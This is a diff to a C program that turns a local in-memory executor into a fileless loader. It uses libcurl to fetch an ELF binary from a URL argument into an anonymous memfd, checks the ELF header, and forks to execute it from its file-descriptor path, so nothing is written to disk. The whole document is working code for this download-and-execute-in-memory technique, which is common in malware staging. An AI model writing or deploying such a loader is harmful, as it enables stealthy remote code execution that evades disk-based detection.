@@ -3,9 +3,16 @@
 #include <sys/stat.h>
 #include <sys/wait.h>
 
+#include <errno.h>
+#include <unistd.h>
+
 #include <stdio.h>
 #include <stdlib.h>
-#include <unistd.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <string.h>
+
+#include <curl/curl.h>
 
 #define EXPECT_NOT(res, err, msg) \
   do {                            \
@@ -15,37 +22,64 @@
     }                             \
   } while (0)
 
-int write_to_mem_file(char* filename) {
-  // Open input file
-  FILE* in_file = fopen(filename, "rb");
-  EXPECT_NOT(in_file, NULL, "[!] Cannot open input file");
+#define EXPECT(res, err, msg) \
+  do {                        \
+    if ((err) != (res)) {     \
+      perror(msg);            \
+      abort();                \
+    }                         \
+  } while (0)
 
-  // Get its size in bytes
-  fseek(in_file, 0, SEEK_END);
-  long in_size = ftell(in_file);
-  fseek(in_file, 0, SEEK_SET);
+#define EXPECT_CUSTOM(res, err, msg)           \
+  do {                                         \
+    if ((err) != (res)) {                      \
+      fprintf(stderr, "%s: %d\n", msg, errno); \
+      abort();                                 \
+    }                                          \
+  } while (0)
 
-  // Create an in-memory file
+#define UNUSED(x) ((void)x)
+
+size_t write_callback(void* data, size_t size, size_t nmemb, void* userp) {
+  static bool    first_run    = true;
+  static uint8_t elf_header[] = {'\177', 'E', 'L', 'F'};
+
+  if (first_run) {
+    errno = 0;
+    EXPECT_CUSTOM(memcmp(data, elf_header, 4), 0, "[!] Server didnt return an ELF executable");
+  }
+
+  ssize_t written = write(*(int*)userp, data, nmemb * size);
+
+  EXPECT_NOT(written, -1, "[!] Cannot write file chunk to memory");
+
+  first_run = false;
+  return written;
+}
+
+int create_mem_fd(void) {
   int out_fd = memfd_create("prog", 0);
   EXPECT_NOT(out_fd, -1, "[!] Cannot create memory file");
-
-  // Sets its size to the input file's size
-  EXPECT_NOT(ftruncate(out_fd, in_size), -1, "[!] Cannot ftruncate output file");
-
-  // Map the output file's data to memory
-  void* out_data = mmap(NULL, in_size, PROT_READ | PROT_WRITE, MAP_SHARED, out_fd, 0);
-  EXPECT_NOT(out_data, MAP_FAILED, "[!] Cannot mmap output memory file");
-
-  // Read the input file directly into this buffer
-  EXPECT_NOT(fread(out_data, in_size, 1, in_file), -1ul, "[!] Cannot read input file");
-
-  // Close the input file
-  EXPECT_NOT(fclose(in_file), EOF, "[!] Cannot close input file");
-
-  // Unmap the region
-  EXPECT_NOT(munmap(out_data, in_size), -1, "[!] Cannot unmap memory region");
-
   return out_fd;
+}
+
+void download_to_fd(int* fd, char* url) {
+  CURL* curl = curl_easy_init();
+  EXPECT_NOT(curl, NULL, "[!] Cannot create CURL object");
+
+  curl_easy_setopt(curl, CURLOPT_URL, url);
+  curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+  curl_easy_setopt(curl, CURLOPT_WRITEDATA, fd);
+
+  CURLcode res = curl_easy_perform(curl);
+
+  errno = 0;
+  EXPECT_CUSTOM(res, CURLE_OK, "[!] Download failed");
+
+  curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &errno);
+  EXPECT_CUSTOM(errno, 200, "[!] Server returned error");
+
+  curl_easy_cleanup(curl);
 }
 
 char* fd_to_path(int fd) {
@@ -54,7 +88,7 @@ char* fd_to_path(int fd) {
   return ret;
 }
 
-void exec_mem_file(char* path, char* argv[]) {
+void exec_file(char* path, char* argv[]) {
   int pid = fork();
   EXPECT_NOT(pid, -1, "[!] Cannot fork");
 
@@ -77,19 +111,20 @@ void exec_mem_file(char* path, char* argv[]) {
 
 int main(int argc, char* argv[]) {
   if (argc != 2) {
-    printf("error: no file specified\n");
+    printf("[!] No URL specified\n");
     return -1;
   }
 
-  int out_fd = write_to_mem_file(argv[1]);
+  int fd = create_mem_fd();
+  download_to_fd(&fd, argv[1]);
 
-  char* out_path = fd_to_path(out_fd);
+  char* fd_path     = fd_to_path(fd);
+  char* mock_argv[] = {fd_path, NULL};
 
-  char* mock_argv[] = {out_path, NULL};
-  exec_mem_file(out_path, mock_argv);
+  exec_file(fd_path, mock_argv);
 
-  free(out_path);
-  close(out_fd);
+  free(fd_path);
+  close(fd);
 
   return 0;
 }
